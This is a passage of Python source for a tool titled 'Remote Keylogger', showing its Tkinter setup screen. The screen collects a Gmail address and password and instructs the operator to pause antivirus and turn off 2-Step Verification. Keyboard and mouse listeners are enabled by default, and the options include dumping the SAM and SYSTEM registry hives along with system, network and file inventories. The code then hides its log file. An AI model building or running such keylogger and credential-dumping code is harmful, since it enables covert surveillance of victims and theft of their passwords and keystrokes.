    log_path: str = f"C:\\Users\\{username}\\RKL\\"  # DYNAMIC VARIABLE

elif operating_system == "Linux":
    if username == "root":
        log_path = "/root/.RKL/"

    else:
        log_path: str = f"/home/{username}/.RKL/"  # DYNAMIC VARIABLE

else:
    log_path: str = "./RKL/"  # DYNAMIC VARIABLE

if not isdir(s=log_path):
    print(
        "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
        "["
        + Fore.BLUE
        + Style.BRIGHT
        + str(datetime.now())
        + Style.RESET_ALL
        + "]\t"
        + Style.BRIGHT
        + f"Making log directory {log_path}"
    )
    mkdir(path=log_path)

print(
    "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
    "["
    + Fore.BLUE
    + Style.BRIGHT
    + str(datetime.now())
    + Style.RESET_ALL
    + "]\t"
    + Style.BRIGHT
    + f"Log Directory (Default): {log_path}"
)
Label(
    master=app,
    text=f"Log Directory (Default): {log_path}",
    bg="lightsteelblue2",
).pack()

email_label_frame: LabelFrame = LabelFrame(
    master=app, text="Enter your email address", bg="lightsteelblue2"
)
email_label_frame.pack(ipadx=10)

email_entry: Entry = Entry(master=email_label_frame, width=45, borderwidth=2)
email_entry.pack()

Label(
    master=email_label_frame,
    text="*(Only handles Gmail address for now)",
    bg="lightsteelblue2",
).pack()

password_label_frame: LabelFrame = LabelFrame(
    master=app, text="Enter your password", bg="lightsteelblue2"
)
password_label_frame.pack(ipadx=10)

password_entry: Entry = Entry(
    master=password_label_frame,
    width=45,
    borderwidth=2,
    show="*",
)
password_entry.pack()

Label(
    master=password_label_frame,
    text="*(We never share or store your password anywhere)",
    bg="lightsteelblue2",
).pack()

to_address_label_frame: LabelFrame = LabelFrame(
    master=app, text="To address", bg="lightsteelblue2"
)
to_address_label_frame.pack(ipadx=10, ipady=5)

to_address_entry: Entry = Entry(
    master=to_address_label_frame,
    width=45,
    borderwidth=2,
)
to_address_entry.pack()

Label(
    master=app,
    text="Pause your PC antivirus if it interferes while running.\n"
    "Don't forget to turn OFF 2-Step Verification.\n"
    "Don't turn ON less secure app access.",
    bg="lightsteelblue2",
    fg="red",
).pack()

account_security_frame: Frame = Frame(
    master=app,
    bg="lightsteelblue2",
)
account_security_frame.pack()

_2fa_button: Button = Button(
    master=account_security_frame,
    text="2-Step Verification",
    bg="red",
    fg="white",
    activebackground="#FF4040",
    width=18,
    command=lambda: browser(
        url="https://myaccount.google.com/signinoptions/two-step-verification"
    ),
)
_2fa_button.bind(
    sequence="<Return>",
    func=lambda event: browser(
        url="https://myaccount.google.com/signinoptions/two-step-verification"
    ),
)
_2fa_button.grid(row=0, column=0, padx=5, pady=3)

lsa_button: Button = Button(
    master=account_security_frame,
    text="Less secure app access",
    bg="red",
    fg="white",
    activebackground="#FF4040",
    width=18,
    command=lambda: browser(url="https://myaccount.google.com/lesssecureapps"),
)
lsa_button.bind(
    sequence="<Return>",
    func=lambda event: browser(url="https://myaccount.google.com/lesssecureapps"),
)
lsa_button.grid(row=0, column=1, padx=5, pady=3)

Label(
    master=app,
    text="What are the things that you want to be logged?",
    bg="lightsteelblue2",
).pack()

checkbutton_frame: Frame = Frame(
    master=app,
    bg="lightsteelblue2",
)
checkbutton_frame.pack()

username_var: IntVar = IntVar()
username_check: Checkbutton = Checkbutton(
    master=checkbutton_frame,
    text="Username",
    bg="lightsteelblue2",
    variable=username_var,
)
username_check.grid(row=0, column=0, sticky=W)
username_check.select()

datetime_var: IntVar = IntVar()
datetime_check: Checkbutton = Checkbutton(
    master=checkbutton_frame,
    text="Date & Time",
    bg="lightsteelblue2",
    variable=datetime_var,
)
datetime_check.grid(row=1, column=0, sticky=W)
datetime_check.select()

public_ip_var: IntVar = IntVar()
public_ip_check: Checkbutton = Checkbutton(
    master=checkbutton_frame,
    text="Public IP",
    bg="lightsteelblue2",
    variable=public_ip_var,
)
public_ip_check.grid(row=2, column=0, sticky=W)
public_ip_check.select()

operating_system_var: IntVar = IntVar()
operating_system_check: Checkbutton = Checkbutton(
    master=checkbutton_frame,
    text="Operating System",
    bg="lightsteelblue2",
    variable=operating_system_var,
)
operating_system_check.grid(row=3, column=0, sticky=W)
operating_system_check.select()

systeminfo_var: IntVar = IntVar()
systeminfo_check: Checkbutton = Checkbutton(
    master=checkbutton_frame,
    text="systeminfo (for Windows only)",
    bg="lightsteelblue2",
    state=DISABLED,
    variable=systeminfo_var,
)
systeminfo_check.grid(row=4, column=0, sticky=W)

wmic_var: IntVar = IntVar()
wmic_check: Checkbutton = Checkbutton(
    master=checkbutton_frame,
    text="wmic product (for Windows only)",
    bg="lightsteelblue2",
    state=DISABLED,
    variable=wmic_var,
)
wmic_check.grid(row=5, column=0, sticky=W)

tree_var: IntVar = IntVar()
tree_check: Checkbutton = Checkbutton(
    master=checkbutton_frame,
    text="tree C:\\Users\\%username% /f /a (for Windows only)",
    bg="lightsteelblue2",
    state=DISABLED,
    variable=tree_var,
)
tree_check.grid(row=6, column=0, sticky=W)

ipconfig_var: IntVar = IntVar()
ipconfig_check: Checkbutton = Checkbutton(
    master=checkbutton_frame,
    text="ipconfig /all (for Windows only)",
    bg="lightsteelblue2",
    state=DISABLED,
    variable=ipconfig_var,
)
ipconfig_check.grid(row=7, column=0, sticky=W)

sam_var: IntVar = IntVar()
sam_check: Checkbutton = Checkbutton(
    master=checkbutton_frame,
    text="reg save HKLM\\SAM /y (for Windows only)",
    bg="lightsteelblue2",
    state=DISABLED,
    variable=sam_var,
)
sam_check.grid(row=8, column=0, sticky=W)

system_var: IntVar = IntVar()
system_check: Checkbutton = Checkbutton(
    master=checkbutton_frame,
    text="reg save HKLM\\SYSTEM /y (for Windows only)",
    bg="lightsteelblue2",
    state=DISABLED,
    variable=system_var,
)
system_check.grid(row=9, column=0, sticky=W)

if operating_system == "Windows":
    systeminfo_check.config(text="systeminfo", state=NORMAL)
    systeminfo_check.select()

    wmic_check.config(
        text="wmic product",
        state=NORMAL,
    )
    wmic_check.select()

    tree_check.config(text="tree C:\\Users\\%username% /f /a", state=NORMAL)
    tree_check.select()

    ipconfig_check.config(text="ipconfig /all", state=NORMAL)
    ipconfig_check.select()

    sam_check.config(text="reg save HKLM\\SAM /y (UAC Elevation Required)")
    system_check.config(text="reg save HKLM\\SYSTEM /y (UAC Elevation Required)")

    if windll.shell32.IsUserAnAdmin():
        sam_check.config(
            text="reg save HKLM\\SAM /y",
            state=NORMAL,
        )
        sam_check.select()

        system_check.config(
            text="reg save HKLM\\SYSTEM /y",
            state=NORMAL,
        )
        system_check.select()

keyboard_listener_var: IntVar = IntVar()
keyboard_listener_check: Checkbutton = Checkbutton(
    master=checkbutton_frame,
    text="Keyboard Listener",
    bg="lightsteelblue2",
    state=DISABLED,
    variable=keyboard_listener_var,
)
keyboard_listener_check.grid(row=10, column=0, sticky=W)

keyboard_listener_check.config(text="Keyboard Listener (DANGER)", state=NORMAL)
keyboard_listener_check.select()

mouse_listener_var: IntVar = IntVar()
mouse_listener_check: Checkbutton = Checkbutton(
    master=checkbutton_frame,
    text="Mouse Listener",
    bg="lightsteelblue2",
    state=DISABLED,
    variable=mouse_listener_var,
)
mouse_listener_check.grid(row=11, column=0, sticky=W)

mouse_listener_check.config(text="Mouse Listener (DANGER)", state=NORMAL)
mouse_listener_check.select()

hr: Canvas = Canvas(
    master=app,
    width=375,
    height=4,
    bg="lightsteelblue2",
)
hr.pack(padx=2, pady=2)
hr.create_line(0, 2, 375, 2, fill="black")

buttons_frame: Frame = Frame(
    master=app,
    bg="lightsteelblue2",
)
buttons_frame.pack()

start_button: Button = Button(
    master=buttons_frame,
    text=" START ",
    bg="red",
    fg="white",
    activebackground="#FF4040",
    width=12,
    command=lambda: start_logging(),
)

if isfile(path=join(base_path, "assets/start.png")):
    start_icon: PhotoImage = PhotoImage(
        file=join(base_path, "assets/start.png")
    ).subsample(x=25, y=25)
    start_button.config(
        image=start_icon,
        compound=LEFT,
        width=105,
        height=20,
    )

else:
    print(Fore.YELLOW + Style.BRIGHT + "-" * 100)
    print(
        Fore.YELLOW
        + Style.BRIGHT
        + f"[WARN]\t[{datetime.now()}]\tassets/start.png file is missing!"
    )
    print(Fore.YELLOW + Style.BRIGHT + "-" * 100)

start_button.bind(sequence="<Return>", func=lambda event: start_logging())
start_button.grid(row=0, column=0, padx=10, pady=5)

exit_button: Button = Button(
    master=buttons_frame,
    text=" EXIT ",
    bg="green",
    fg="white",
    activebackground="#40C040",
    width=12,
    command=lambda: exit_gui(),
)

if isfile(path=join(base_path, "assets/exit.png")):
    exit_icon: PhotoImage = PhotoImage(
        file=join(base_path, "assets/exit.png")
    ).subsample(x=25, y=25)
    exit_button.config(
        image=exit_icon,
        compound=LEFT,
        width=105,
        height=20,
    )

else:
    print(Fore.YELLOW + Style.BRIGHT + "-" * 100)
    print(
        Fore.YELLOW
        + Style.BRIGHT
        + f"[WARN]\t[{datetime.now()}]\tassets/exit.png file is missing!"
    )
    print(Fore.YELLOW + Style.BRIGHT + "-" * 100)

exit_button.bind(sequence="<Return>", func=lambda event: exit_gui())
exit_button.grid(row=0, column=1, padx=10, pady=5)

hr: Canvas = Canvas(
    master=app,
    width=375,
    height=4,
    bg="lightsteelblue2",
)
hr.pack(padx=2, pady=2)
hr.create_line(0, 2, 375, 2, fill="black")

Label(
    master=app,
    text=f"Created by JahidFariz & Made with Love in India.",
    bg="black",
    fg="white",
).pack(side=BOTTOM, fill=X)

elapsed_time: float = time() - initial_time
print(
    "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
    "["
    + Fore.BLUE
    + Style.BRIGHT
    + str(datetime.now())
    + Style.RESET_ALL
    + "]\t"
    + Style.BRIGHT
    + f"Booting Time: {elapsed_time} second(s)"
)
Label(
    master=app,
    text=f"Booting Time: {elapsed_time} second(s)",
    bg="lightsteelblue2",
).pack(side=BOTTOM)

app.deiconify()  # un-hides gui window

# Checking log file existence.
if isfile(path=log_path + ".log.txt"):
    print(
        Fore.YELLOW
        + Style.BRIGHT
        + f"[INFO]\t[{datetime.now()}]\tPrevious log files found. Would you like to delete?"
    )

    app.withdraw()  # hides gui window

    if operating_system == "Windows":
        MessageBeep()

    # USER CONTROL FLOW
    if askokcancel(
        title=f"Remote Keylogger {__version__}",
        message="Previous log files found.\nWould you like to delete?",
    ):
        try:
            print(
                "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
                "["
                + Fore.BLUE
                + Style.BRIGHT
                + str(datetime.now())
                + Style.RESET_ALL
                + "]\t"
                + Style.BRIGHT
                + "Deleting previous log files..."
            )
            remove(path=log_path + ".log.txt")

        except PermissionError as permission_error:
            clear_screen()

            print(Fore.RED + Style.BRIGHT + "-" * 100)
            print(Fore.RED + Style.BRIGHT + "Error Code: PermissionError")
            print(
                Fore.RED
                + Style.BRIGHT
                + f"[ERROR]\t[{datetime.now()}]\tFailed to delete old log files!"
            )
            print(
                Fore.RED
                + Style.BRIGHT
                + f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {permission_error}"
            )
            print(Fore.RED + Style.BRIGHT + "-" * 100)

            # USER CONTROL FLOW
            showerror(
                title=f"Remote Keylogger {__version__}",
                message=f"Failed to delete old log files.\n{permission_error}",
            )

            app.destroy()
            terminate()

    app.deiconify()  # un-hides gui window

print(
    "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
    "["
    + Fore.BLUE
    + Style.BRIGHT
    + str(datetime.now())
    + Style.RESET_ALL
    + "]\t"
    + Style.BRIGHT
    + "Creating log file..."
)
basicConfig(
    filename=log_path + ".log.txt",
    level=10,  # 10 WHICH MEANS DEBUG
    format="%(asctime)s:\t%(message)s",
)

if operating_system == "Windows":
    print(
        "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
        "["
        + Fore.BLUE
        + Style.BRIGHT
        + str(datetime.now())
        + Style.RESET_ALL
        + "]\t"
        + Style.BRIGHT
        + "Hiding log file, Please wait..."
    )
    print(
        "["
        + Fore.YELLOW
        + Style.BRIGHT
        + "EXEC"
        + Style.RESET_ALL
        + "]\t["
        + Fore.BLUE
        + Style.BRIGHT
        + str(datetime.now())
        + Style.RESET_ALL
        + "]\t"
        + Style.BRIGHT
        + f"attrib +h {log_path}.log.txt"
    )

    terminal(command=f"attrib +h {log_path}.log.txt")

print(Fore.RED + Style.BRIGHT + "-" * 100)

app.mainloop()
